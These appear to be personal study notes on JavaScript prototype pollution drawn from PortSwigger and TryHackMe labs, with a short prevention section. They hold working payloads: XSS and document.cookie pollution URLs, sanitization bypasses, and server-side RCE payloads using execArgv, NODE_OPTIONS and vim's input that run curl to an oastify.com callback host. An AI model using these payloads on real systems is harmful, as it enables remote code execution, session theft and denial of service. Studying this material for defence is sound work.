
# Burp Notes
***Prototype pollution** is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.*
## Prototypes
JavaScript Object (in JSON) is key:value pairs

```JS
const user = { 
	username: "wiener", 
	userId: 01234, 
	isAdmin: false 
	}
```

Dot notation or Bracket notation can refer to their respective keys:`
```
user.username // "wiener" 
user['userId'] // 01234`
```

Properties can also contain executable functions, called **methods**. 
"Object literals" are created using *curly brace syntax*
The term "object" refers to all entities, not just object literals

*Every object in JavaScript is linked to another object of some kind, known as its prototype.* For example, strings are automatically assigned the built-in `String.prototype`. 

```
let myObject = {}; Object.getPrototypeOf(myString); // String.prototype
```

*Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key.* The built-in prototypes provide useful properties and methods for working with basic data types. For example, the `String.prototype` object has a `toLowerCase()` method. As a result, all strings automatically have a ready-to-use method for converting them to lowercase.

Object inheritance - if there isn't a matching property on the working object JS checks for it on the prototype. That prototype has its own prototype so JS keeps checking up the chain because everything is an object. So `username` might have access to properties and methods of `String.prototype` and `Object.prototype` (the prototype of `String.prototype`)

As with any property, you can access `__proto__` using either bracket or dot notation:
```JS
username.__proto__ 
username['__proto__']
```
 Chain references: 
 ```JS
username.__proto__ // String.prototype 
username.__proto__.__proto__ // Object.prototype
username.__proto__.__proto__.__proto__ // null
 ```


## Prototype Pollution
**Prototype pollution vulnerabilities** typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys.
- It's possible to pollute any prototype object, but this most commonly occurs with the built-in global `Object.prototype`.
- Due to the special meaning of `__proto__` in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself.

Successful exploitation of prototype pollution requires the following key components:
- **Prototype pollution source** - Any input that enables you to poison prototype objects with arbitrary properties, must be user-controllable. Most common:
	- The URL via either the query or fragment string (hash)
	- JSON-based input
	- Web messages
- **Sink** - A JavaScript function or DOM element that enables arbitrary code execution.
- **Exploitable gadget** - Any property that is passed into a sink without proper filtering or sanitization.

### Pollution via URL
Consider the URL, which contains a user-constructed string query:
`https://vulnerable-website.com/?__proto__[evilProperty]=payload`

You might think `__proto__` could be just an arbitrary string, when if these keys are values are merged later into an existing object as properties: 

```JS
{ 
	existingProperty1: 'foo', 
	existingProperty2: 'bar', 
	__proto__: { 
		evilProperty: 'payload' 
	} 
}
```
However, **this isn't the case**. At some point, the recursive merge operation may assign the value of `evilProperty` using a statement equivalent to the following:
`targetObject.__proto__.evilProperty = 'payload';`

During this assignment, the JavaScript engine treats `__proto__` as a getter for the prototype. As a result, `evilProperty` is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default `Object.prototype`, all objects in the JavaScript runtime will now inherit `evilProperty`, unless they already have a property of their own with a matching key.
- This may not really matter unless an attacker pollute the prototype with properties used by the application or imported libraries. 


### Pollution via URL 

User-controllable objects are often derived from a JSON string using the `JSON.parse()` method. Interestingly, `JSON.parse()` also treats any key in the JSON object as an arbitrary string, including things like `__proto__`. This provides another potential vector for prototype pollution.
```JS
{ 
	"__proto__": { 
		"evilProperty": "payload" 
	} 
}
```
If this is converted into a JavaScript object via the `JSON.parse()` method, the resulting object will in fact have a property with the key `__proto__`:
```JS
const objectLiteral = {__proto__: {evilProperty: 'payload'}}; 
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}'); 

objectLiteral.hasOwnProperty('__proto__'); // false
objectFromJson.hasOwnProperty('__proto__'); // true
```

### Sinks and Gadgets
A prototype pollution **sink** is essentially just a JS function or DOM element that you're able to access via prototype pollution. 
- This may allow you to reach other sinks which may not be accessible from the first one 

A **gadget** provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:
- *Used by the application in an unsafe way*, such as passing it to a sink without proper filtering or sanitization.
- *Attacker-controllable via prototype pollution*. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.

## Client-side prototype pollution

Finding prototype pollution sources manually is largely a case of trial and error. In short, you need to try different ways of adding an arbitrary property to `Object.prototype` until you find a source that works. When testing for client-side vulnerabilities, **this involves the following high-level steps**:
1. *Try to inject an arbitrary property via the query string, URL fragment, and any JSON input*. For example:
    `vulnerable-website.com/?__proto__[foo]=bar`
2. *In your browser console, inspect `Object.prototype` to see if you have successfully polluted it with your arbitrary property*:
    `Object.prototype.foo // "bar" indicates that you have successfully polluted the prototype // undefined indicates that the attack was not successful`
3. I*f the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa*:
    `vulnerable-website.com/?__proto__.foo=bar`
4. *Repeat this process* for each potential source.

### Finding client-side prototype pollution gadgets manually
Once you've identified a source that lets you add arbitrary properties to the global `Object.prototype`, the next step is to find a suitable gadget that you can use to craft an exploit. In practice, we recommend using DOM Invader to do this, but it's useful to look at the manual process as it may help solidify your understanding of the vulnerability.

1. Look through the source code and *identify any properties that are used by the application or any libraries that it imports*.
2. In Burp, *enable response **interception*** for the response containing the JavaScript that you want to test.
3. Add a `debugger` statement at the start of the script, then forward any remaining requests and responses.
4. In Burp's browser, go to the page on which the target script is loaded. The `debugger` statement pauses execution of the script.
5. While the script is still paused, switch to the console and enter the following command, replacing `YOUR-PROPERTY` with one of the properties that you think is a potential gadget:
    `Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', { get() { console.trace(); return 'polluted'; } })`

    The property is added to the global `Object.prototype`, and the browser will log a stack trace to the console whenever it is accessed.
6. Press the button to continue execution of the script and monitor the console. If a stack trace appears, this confirms that the property was accessed somewhere within the application.
7. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.
8. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as `innerHTML` or `eval()`.
9. Repeat this process for any properties that you think are potential gadgets.


## Lab 2 - DOM XSS via an alternative prototype pollution vector
May need to add a `-` to the end of the DOM exploit for some reason
- This was because of the js appending a one if there was a string defined for `manager.sequence`
- ```
  let a = manager.sequence || 1;
   manager.sequence = a + 1;
  ```


## Prototype pollution via the constructor

Unless its prototype is set to `null`, every JavaScript object has a `constructor` property, which contains a reference to the constructor function that was used to create it. For example, you can create a new object either using literal syntax or by explicitly invoking the `Object()` constructor as follows:
```JS
let myObjectLiteral = {}; 
let myObject = new Object();
```
You can then reference the `Object()` constructor via the built-in `constructor` property:
```JS
myObjectLiteral.constructor // function Object(){...} 
myObject.constructor // function Object(){...}
```

Remember that functions are also just objects under the hood. Each constructor function has a `prototype` property, which points to the prototype that will be assigned to any objects that are created by this constructor. As a result, you can also access any object's prototype as follows:
```JS
myObject.constructor.prototype // Object.prototype
myString.constructor.prototype // String.prototype 
myArray.constructor.prototype // Array.prototype
```
As `myObject.constructor.prototype` is equivalent to `myObject.__proto__`, this provides an alternative vector for prototype pollution.


## Flawed Sanitization 

`vulnerable-website.com/?__pro__proto__to__.gadget=payload` when sanitized becomes: `vulnerable-website.com/?__proto__.gadget=payload`

Ex:
```
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar 
/?constconstructorructor[protoprototypetype][foo]=bar 
/?constconstructorructor.protoprototypetype.foo=bar
```

Ans: 
`/?__pro__proto__to__.[transport_url]=data;,alert(1);`


## External Libraries
Recommended to use DOM Invader for this

With Exploit Server:
`<script>document.location="https://0a73001f046659ac8059686c00390073.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories#cat=13372&category=Clothing%2C+shoes+and+accessories&constructor[prototype][hitCallback]=alert%28document.cookie%29"</script>`

## Prototype Pollution via browser APIs
Fetch API requires 2 arguments: 
- URL 
- Options object (includes method (POST), headers, body parameters, etc)
```
fetch('https://normal-website.com/my-account/change-email', { 
	method: 'POST', 
	body: 'user=carlos&email=carlos%40ginandjuice.shop' 
})
```

Ex:
```JS
fetch('/my-products.json',{method:"GET"}) 
	.then((response) => response.json()) 
	.then((data) => { 
		let username = data['x-username']; 
		let message = document.querySelector('.message'); 
		if(username) { 
			message.innerHTML = `My products. Logged in as <b>${username}</b>`; 
		} 
		let productList = document.querySelector('ul.products'); 
		for(let product of data) { 
			let product = document.createElement('li'); 
			product.append(product.name); 
			productList.append(product); 
		} 
	}) 
	.catch(console.error);
```

To exploit this, an attacker could pollute `Object.prototype` with a `headers` property containing a malicious `x-username` header as follows:

`?__proto__[headers][x-username]=<img/src/onerror=alert(1)>`

## Server-side prototype pollution

More difficult with dev tools or source code, plus failing is persistent and can cause DoS. 

Consider: 
```
POST /user/update HTTP/1.1 
Host: vulnerable-website.com ... 
{ 
	"user":"wiener", 
	"firstName":"Peter", 
	"lastName":"Wiener", 
	"__proto__":{ 
		"foo":"bar" 
	}
}
```

![](/assets/images/Prototype%20Pollution/server-side_prototype_pollution.png)
- Started with `__proto__` adding `"foo":"bar"` and saw the response showing `isAdmin` so changed `__proto__` to include `isAdmin`


### Status code override
You might get a 200 response, but the error code in the page shows 404 because of JS frameworks like Express allowing developers to set custom HTTP responses


### JSON spaces override

The Express framework provides a `json spaces` option, which enables you to configure the number of spaces used to indent any JSON data in the response. 
- try polluting the prototype with your own `json spaces` property, then reissue the relevant request to see if the indentation in the JSON increases accordingly. 
- *Although the prototype pollution has been fixed in Express 4.17.4, websites that haven't upgraded may still be vulnerable.*
- Doesn't rely on a specific property, and you can reset it if necessary
- **Remember to switch to the Raw** tab or you won't be able to see the indentation change 

## Charset override

Express servers often implement so-called "middleware" modules that enable preprocessing of requests before they're passed to the appropriate handler function. For example, the `body-parser` module is commonly used to parse the body of incoming requests in order to generate a `req.body` object. This contains another gadget that you can use to probe for server-side prototype pollution.

Notice that the following code passes an options object into the `read()` function, which is used to read in the request body for parsing. One of these options, `encoding`, determines which character encoding to use. This is either derived from the request itself via the `getCharset(req)` function call, or it defaults to UTF-8.

```
var charset = getCharset(req) or 'utf-8' 

function getCharset (req) { 
	try { 
		return (contentType.parse(req).parameters.charset || '').toLowerCase() 
	} catch (e) { 
		return undefined 
	} 
} 

read(req, res, next, parse, debug, { 
	encoding: charset, 
	inflate: inflate, 
	limit: limit, 
	verify: verify 
})
```

If you look closely at the `getCharset()` function, it looks like the developers have anticipated that the `Content-Type` header may not contain an explicit `charset` attribute, so they've implemented some logic that reverts to an empty string in this case. Crucially, this means it may be controllable via prototype pollution.

#### Testing
Test by sending something in UTF-7, which won't be decoded by default. Then you can pollute the prototype with a `content-type` property to decode it that explicitly specifies UTF-7. If it works, the UTF-7 should be decoded. Ex:

1. Add an arbitrary UTF-7 encoded string to a property that's reflected in a response. For example, `foo` in UTF-7 is `+AGYAbwBv-`.
```
{ 
	"sessionId":"0123456789", 
	"username":"wiener", 
	"role":"+AGYAbwBv-" 
	}
```
2. Send the request. Servers won't use UTF-7 encoding by default, so this string should appear in the response in its encoded form.
3. Try to pollute the prototype with a `content-type` property that explicitly specifies the UTF-7 character set:
```
{ 
	"sessionId":"0123456789", 
	"username":"wiener", 
	"role":"default", 
	"__proto__":{ 
		"content-type": "application/json; charset=utf-7" 
	} 
}
```
4. Repeat the first request. If you successfully polluted the prototype, the UTF-7 string should now be decoded in the response:
```
{ 
	"sessionId":"0123456789", 
	"username":"wiener", 
	"role":"foo" 
}
```

- Node.js's `Content-Type` header can even be overwritten this way 

If `__proto__` doesn't work, try:
```
"constructor": {
	"prototype": {
		"json spaces": 2
	}
}
```
- Remember it's **prototype** not **__proto__**
- Also `json spaces` can help test, should show difference in the **Raw** Burp Response


## RCE

*There are a number of potential command execution sinks in Node, many of which occur in the `child_process` module.* These are often invoked by a request that occurs asynchronously to the request with which you're able to pollute the prototype in the first place. As a result, **the best way to identify these requests** is by polluting the prototype with a payload that *triggers an interaction with Burp Collaborator* when called.

The `NODE_OPTIONS` environment variable enables you to define a string of command-line arguments that should be used by default whenever you start a new Node process. As this is also a property on the `env` object, you can potentially control this via prototype pollution if it is undefined.

Some of Node's functions for creating new child processes accept an optional `shell` property, which enables developers to set a specific shell, such as bash, in which to run commands. By combining this with a malicious `NODE_OPTIONS` property, you can pollute the prototype in a way that causes an interaction with Burp Collaborator whenever a new Node process is created:

```
"__proto__": { 
	"shell":"node", 
	"NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com" 
	}
```

This way, you can easily identify when a request creates a new child process with command-line arguments that are controllable via prototype pollution. Methods such as `child_process.spawn()` and `child_process.fork()` enable developers to create new Node subprocesses. The `fork()` method accepts an options object in which one of the potential options is the `execArgv` property. This is an array of strings containing command-line arguments that should be used when spawning the child process. If it's left undefined by the developers, this potentially also means it can be controlled via prototype pollution.

Of particular interest is the `--eval` argument, which enables you to pass in arbitrary JavaScript that will be executed by the child process. This can be quite powerful, even enabling you to load additional modules into the environment:
```
"execArgv": [ 
	"--eval=require('<module>')" 
]
```

Ex: 

```
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"B0FOQwtgIwyYdkdozrRGswks66XlMyw2",
	"__proto__": {
		"json spaces":10
	}
}

```


```
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"B0FOQwtgIwyYdkdozrRGswks66XlMyw2",
	"__proto__": {
		"execArgv":[
		     "--eval=require('child_process').execSync('curl uvtf0wevmk0z37weibb6g6uaa1gs4msb.oastify.com')"
	    ]
	}
}
```


### child_process.execSync()
Just like `fork()`, the `execSync()` method also accepts options object, which may be pollutable via the prototype chain. Although this doesn't accept an `execArgv` property, you can still inject system commands into a running child process by simultaneously polluting both the `shell` and `input` properties:

- The `input` option is just a string that is passed to the child process's `stdin` stream and executed as a system command by `execSync()`. As there are other options for providing the command, such as simply passing it as an argument to the function, the `input` property itself may be left undefined.
- The `shell` option lets developers declare a specific shell in which they want the command to run. By default, `execSync()` uses the system's default shell to run commands, so this may also be left undefined

By *polluting both of these properties*, you may be able to override the command that the application's developers intended to execute and instead run a malicious command in a shell of your choosing. Note that there are a few **caveats** to this:
- The `shell` option *only accepts the name of the shell's executable* and does not allow you to set any additional command-line arguments.
- The shell is always executed with the `-c` argument, which most shells use to let you pass in a command as a string. However, setting the `-c` flag in Node instead runs a syntax check on the provided script, which also prevents it from executing. As a result, although there are **workarounds** for this, it's generally *tricky to use Node itself as a shell for your attack*.
- As the `input` property containing your payload is passed via `stdin`, **the shell you choose must accept commands from** `stdin`.

Interestingly, the text editors Vim and ex reliably fulfill all of these criteria.
- Vim has an interactive prompt and expects the user to hit `Enter` to run the provided command. As a result, you need to simulate this by including a newline (`\n`) character at the end of your payload, as shown in the example above. Ex:
```
"shell":"vim", 
"input":":! <command>\n"
```

**One additional limitation** of this technique is that *some tools that you might want to use for your exploit also don't read data from `stdin` by default*. However, there are a few simple ways around this. 
- In the case of `curl`, for example, you can read `stdin` and send the contents as the body of a `POST` request using the `-d @-` argument.
- In other cases, you can use `xargs`, which converts `stdin` to a list of arguments that can be passed to a command.


## Preventing

Invoking the `Object.freeze()` method on an object ensures that its properties and their values can no longer be modified, and no new properties can be added. As prototypes are just objects themselves, you can use this method to proactively cut off any potential sources. The `Object.seal()` method is similar, but still allows changes to the values of existing properties. This may be a good compromise if you're unable to use `Object.freeze()` for any reason.


# THM Notes

## Javascript Recap

**Objects** are like containers than can hold different pieces of information. In a social network, a profile might be an object. 
```js
let user = {   
	name: 'Ben S',   
	age: 25,   
	followers: 200,   
	DoB: '1/1/1990'
 };`
```

`user` is the object and `name`, `age`, and `followers` are properties. 

**Classes** are blueprints which help to create multiple objects. 

```javascript
// Class for User 
class UserProfile {
  constructor(name, age, followers, dob) {
    this.name = name;
    this.age = age;
    this.followers = followers;
    this.dob = dob; // Adding Date of Birth
  }
}

// Class for Content Creator Profile inheriting from User 
class ContentCreatorProfile extends User {
  constructor(name, age, followers, dob, content, posts) {
    super(name, age, followers, dob);
    this.content = content;
    this.posts = posts;
  }
}

// Creating instances of the classes
let regularUser = new UserProfile('Ben S', 25, 1000, '1/1/1990');
let contentCreator = new ContentCreatorProfile('Jane Smith', 30, 5000, '1/1/1990', 'Engaging Content', 50);
```

Now `User` and `ContentCreatorProfile` are classes. 

**Prototypes** - In JavaScript, every object is linked to a prototype object, and these prototypes form a chain commonly referred to as the **prototype chain**. The prototype serves as a template or blueprint for objects.

**Classes** and **prototypes** in JS are two ways to achieve a similar goal: creating objects with behaviours and characteristics.


## Summary

### **1. Prototypes**

Prototypes are the core mechanism of inheritance in JavaScript. Every object in JavaScript has an internal link to a prototype object, which is used to share properties and methods.

Key Characteristics:
- **Prototype Chain**:
    - When you try to access a property or method on an object, JavaScript looks for it on the object first. If it doesn’t exist, it searches the prototype chain until it finds it or reaches the end (`null`).
- **Dynamic Modification**:
    - The prototype of an object can be modified at runtime, allowing shared behavior across objects.
- **Shared Memory**:
    - Methods and properties defined on a prototype are shared across all instances.

Example: 
```js
function Animal() {} // A constructor function
Animal.prototype.speak = function() {
    console.log("I can speak");
};

let dog = new Animal();
dog.speak(); // Outputs: "I can speak"

```

##### Security Implications for Pentesters:
- **Prototype Pollution**:
    - If an attacker can modify `Object.prototype` (or another prototype in the chain), they can inject malicious properties or methods that affect all objects.
Ex:
```js
Object.prototype.isAdmin = true;
console.log({}.isAdmin); // Outputs: true
```
- **Code Execution**:
	- Overwriting critical functions (e.g., `toString`) in the prototype can lead to crashes or unexpected behavior.

### **2. Classes**

Classes in JavaScript are syntactic sugar over the existing prototype-based inheritance model. Introduced in ES6, they make the code look more like traditional OOP languages (e.g., Java or C++), but under the hood, they still use prototypes.

Key Characteristics:
- **Syntax and Organization**:
    - Classes provide a cleaner, more readable way to define objects and inheritance.
- **Encapsulation**:
    - They allow encapsulation of methods and properties within the class body.
- **Static Methods**:
    - Classes can define static methods that don’t depend on an instance.
Ex:
```js
class Animal {
    speak() {
        console.log("I can speak");
    }
}
let dog = new Animal();
dog.speak(); // Outputs: "I can speak"
```

##### Security Implications for Pentesters:
- Still Prototype-Based:
    - Even with classes, objects still use the prototype chain. For example:
```js
console.log(Animal.prototype.speak === dog.speak); // true
```
- Misconfiguration:
	- If developers use classes with poor understanding, they might accidentally expose sensitive methods or data via prototypes.

## How Prototype Pollution Works
Prototype pollution is a vulnerability that arises when an attacker manipulates an object's prototype, impacting all instances of that object. This can be done through a few different methods. 

### XSS
If you have the opportunity to update a value for one of the properties, you may be able to use XSS to update the value for all objects. This is done through basic XSS means, i.e. if you are able to enter the name of a new profile and use
`<script>alert('anycontent')</script>`

### Property Injection

Important Functions: 
- **Object Recursive Merge** - This function involves recursively merging properties from source objects into a target object.
	- An attacked could send a request with a nested object using 
  `{ "__proto__": { "newProperty": "value" } }` to update the values for all objects being merged. 
- **Object Clone** - Object cloning is a similar functionality that allows deep clone operations to copy properties from the prototype chain to another one inadvertently.

### Denial of Service
For example, you could override a commonly used function such as `toString`: 
```javascript
{"__proto__": {"toString": "Just crash the server"}}
```
This will break the function causing a DDoS. 
